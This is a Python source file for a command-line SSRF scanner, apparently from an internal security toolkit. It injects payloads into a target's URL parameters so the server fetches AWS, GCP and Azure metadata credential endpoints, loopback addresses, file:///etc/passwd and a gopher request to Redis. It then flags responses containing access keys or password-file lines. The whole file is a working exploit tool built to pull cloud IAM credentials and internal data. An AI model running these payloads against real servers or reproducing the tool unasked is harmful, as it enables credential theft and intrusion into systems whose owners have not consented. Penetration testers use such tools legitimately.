#!/usr/bin/env python3
"""ssrf_cloud.py — SSRF to cloud metadata / internal services (INTERNAL).

Finds URL-accepting params and makes the server fetch cloud metadata
(AWS/GCP/Azure IAM creds), internal services, or local files.
Confirms by fingerprinting fetched content, not by guessing.

    python TOOLS/ssrf_cloud.py --url "http://host/api/fetch?url=x" --param url
    python TOOLS/ssrf_cloud.py --url http://host/api/preview --param target --self http://127.0.0.1:9200
"""
import argparse
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

URL_PARAM_NAMES = ("url", "uri", "target", "dest", "destination", "redirect", "next",
                   "fetch", "callback", "webhook", "image", "img", "src", "proxy",
                   "load", "site", "host", "link", "feed", "u", "path", "file")

FINGERPRINTS = ("AKIA", "ASIA", "iam/security-credentials", "ami-id", "instance-id",
                "computeMetadata", "root:x:0:0", "brk_internal", "brk_iam",
                "aws_key", "SecretAccessKey", "Token")


def payloads(self_origin):
    p = [
        ("AWS IMDS",           "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS IMDS root",      "http://169.254.169.254/latest/meta-data/"),
        ("GCP metadata",       "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure IMDS",         "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("localhost",          "http://127.0.0.1/"),
        ("localhost-alt",      "http://0.0.0.0/"),
        ("ipv6 loopback",      "http://[::1]/"),
        ("decimal-ip",         "http://2130706433/"),
        ("file scheme",        "file:///etc/passwd"),
        ("gopher scheme",      "gopher://127.0.0.1:6379/_INFO"),
    ]
    if self_origin:
        base = self_origin.rstrip("/")
        p += [("self internal creds", base + "/internal/creds"),
              ("self meta mock",      base + "/latest/meta-data/iam/security-credentials/role")]
    return p


class SSRFCloud(VibeTool):
    def __init__(self, base):
        super().__init__("SSRF Cloud", "SSRF to Cloud Metadata / Internal")
        self.base = base
        self.findings = 0

    def _inject(self, param, value):
        parsed = urllib.parse.urlparse(self.base)
        q = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        q[param] = value
        url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))
        try:
            req = urllib.request.Request(url, headers={"User-Agent": privacy_user_agent("SSRF Cloud")})
            with urllib.request.urlopen(req, timeout=6) as r:
                return r.getcode(), r.read(8000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(8000).decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    def _params(self, override):
        if override:
            return [override]
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(self.base).query))
        found = [k for k in q if k.lower() in URL_PARAM_NAMES]
        return found or list(q) or ["url"]

    def run(self, param, self_origin):
        self.banner()
        params = self._params(param)
        self.log(f"Testing SSRF on param(s): {params}")
        for prm in params:
            for label, payload in payloads(self_origin):
                st, body = self._inject(prm, payload)
                content = body.replace(payload, "").replace(urllib.parse.quote(payload, safe=""), "")
                is_error = any(e in body.lower() for e in
                               ("error", "forbidden", "not known", "refused", "timed out", "unreachable"))
                if st == 200 and not is_error and any(fp in content for fp in FINGERPRINTS):
                    self.log(f"SSRF CONFIRMED via {prm}={label} — server fetched internal/metadata content", "hack")
                    self.log(f"  {payload} -> {content[:140].strip()}", "crit")
                    self.findings += 1
                elif st and label.startswith(("AWS", "GCP", "Azure")):
                    reached = "reached (data may be blocked)" if st in (200, 401, 403) else f"attempted ({st})"
                    self.log(f"  {prm}={label}: server {reached} — no creds returned", "info")
        self.log("=" * 40)
        if self.findings:
            self.log(f"SSRF SWEEP COMPLETE — {self.findings} confirmed internal reach(es)", "hack")
        else:
            self.log("No SSRF confirmed — param not fetching attacker URLs, or egress filtered.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="SSRF Cloud - SSRF to cloud metadata / internal services")
    p.add_argument("--url", required=True)
    p.add_argument("--param", default="")
    p.add_argument("--self", dest="self_origin", default="")
    p.add_argument("-v", "--version", action="version", version="SSRF Cloud 1.0.0")
    args = p.parse_args(argv)
    return SSRFCloud(args.url).run(args.param, args.self_origin)


if __name__ == "__main__":
    sys.exit(main())
